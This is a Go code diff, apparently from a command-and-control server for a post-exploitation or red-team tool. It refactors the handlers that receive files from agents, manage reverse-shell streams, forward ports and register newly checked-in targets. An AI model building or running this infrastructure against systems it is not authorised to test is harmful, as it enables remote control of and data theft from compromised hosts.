@@ -9,6 +9,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -28,7 +29,6 @@ type StreamHandler struct {
 	Buf     chan []byte   // buffer for receiving data
 	Token   string        // token string, for agent auth
 	BufSize int           // buffer size for reverse shell should be 1
-	Mutex   *sync.Mutex   // prevent concurrent write to map
 }
 
 var (
@@ -41,8 +41,20 @@ var (
 	// FTPStreams file transfer handlers
 	FTPStreams = make(map[string]*StreamHandler)
 
+	// FTPMutex lock
+	FTPMutex = &sync.Mutex{}
+
+	// RShellStreams rshell handlers
+	RShellStreams = make(map[string]*StreamHandler)
+
+	// RShellMutex lock
+	RShellMutex = &sync.Mutex{}
+
 	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
 	PortFwds = make(map[string]*PortFwdSession)
+
+	// PortFwdsMutex lock
+	PortFwdsMutex = &sync.Mutex{}
 )
 
 // ftpHandler handles buffered data
@@ -52,7 +64,7 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		sh.H2x.Cancel != nil ||
 		sh.H2x.Conn != nil {
 		CliPrintError("ftpHandler: occupied")
-		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
+		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
 		return
 	}
 
@@ -62,7 +74,7 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
 	if err != nil {
 		CliPrintError("ftpHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
-		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
+		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
 		return
 	}
 
@@ -90,7 +102,19 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		CliPrintError("%s failed to parse filename", sh.Token)
 		return
 	}
+	filename = util.FileBaseName(filename) // we dont want the full path
 	filewrite := FileGetDir + filename + ".downloading"
+	lock := FileGetDir + filename + ".lock"
+	// is the file already being downloaded?
+	if util.IsFileExist(lock) {
+		CliPrintError("%s is already being downloaded", filename)
+		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
+		return
+	}
+
+	// create lock file
+	_, err = os.Create(lock)
+
 	// FileGetDir
 	if !util.IsFileExist(FileGetDir) {
 		err = os.MkdirAll(FileGetDir, 0700)
@@ -109,10 +133,16 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		}
 		sh.Token = ""
 		sh.H2x.Cancel()
-		sh.Mutex.Lock()
+		FTPMutex.Lock()
 		delete(FTPStreams, filename)
-		sh.Mutex.Unlock()
+		FTPMutex.Unlock()
 		CliPrintWarning("Closed ftp connection from %s", req.RemoteAddr)
+
+		// delete the lock file, unlock download session
+		err = os.Remove(lock)
+		if err != nil {
+			CliPrintWarning("Remove %s: %v", lock, err)
+		}
 
 		// have we finished downloading?
 		targetFile := FileGetDir + util.FileBaseName(filename)
@@ -127,35 +157,38 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 			CliPrintSuccess("Downloaded %d bytes to %s (%s)", nowSize, targetFile, checksum)
 			return
 		}
+		if nowSize > targetSize {
+			CliPrintError("Downloaded (%d of %d bytes), WTF?", nowSize, targetSize)
+			return
+		}
 		CliPrintWarning("Incomplete download (%d of %d bytes), will continue if you run GET again", nowSize, targetSize)
 	}()
 
-	go func() {
-		f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
-		if err != nil {
-			CliPrintError("processAgentData write file: %v", err)
-		}
-		defer f.Close()
-
-		// write the file
-		for filedata := range sh.Buf {
-			_, err = f.Write(filedata)
-			if err != nil {
-				CliPrintError("processAgentData failed to save file: %v", err)
-				return
-			}
-		}
-	}()
+	// open file for writing
+	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+		CliPrintError("ftpHandler write file: %v", err)
+	}
+	defer f.Close()
 
 	// read filedata
 	for sh.H2x.Ctx.Err() == nil {
 		data := make([]byte, sh.BufSize)
-		_, err = sh.H2x.Conn.Read(data)
+		n, err := sh.H2x.Conn.Read(data)
 		if err != nil {
 			CliPrintWarning("Disconnected: ftpHandler read: %v", err)
 			return
 		}
-		sh.Buf <- data
+		if n < sh.BufSize {
+			data = data[:n]
+		}
+
+		// write the file
+		_, err = f.Write(data)
+		if err != nil {
+			CliPrintError("ftpHandler failed to save file: %v", err)
+			return
+		}
 	}
 }
 
@@ -196,7 +229,7 @@ func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Reque
 		buf = []byte(idstr)
 	}
 
-	sessionID, err := uuid.ParseBytes(buf)
+	sessionID, err := uuid.ParseBytes(buf[:36]) // uuid is 36 bytes long
 	if err != nil {
 		CliPrintError("portFwd connection: failed to parse UUID: %s from %s\n%v", buf, req.RemoteAddr, err)
 		return
@@ -401,14 +434,21 @@ func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
 	// set target IP
 	target.IP = req.RemoteAddr
 
-	if !agentExists(&target) {
+	if !IsAgentExist(&target) {
 		inx := assignTargetIndex()
 		Targets[&target] = &Control{Index: inx, Conn: nil}
 		shortname := strings.Split(target.Tag, "-agent")[0]
+		// set labels
+		if util.IsFileExist(AgentsJSON) {
+			var mutex = &sync.Mutex{}
+			if l := SetAgentLabel(&target, mutex); l != "" {
+				shortname = l
+			}
+		}
 		CliPrintSuccess("\n[%d] Knock.. Knock...\n%s from %s, "+
-			"running '%s'\n",
+			"running %s\n",
 			inx, shortname, fmt.Sprintf("%s - %s", target.IP, target.Transport),
-			target.OS)
+			strconv.Quote(target.OS))
 	}
 }
 
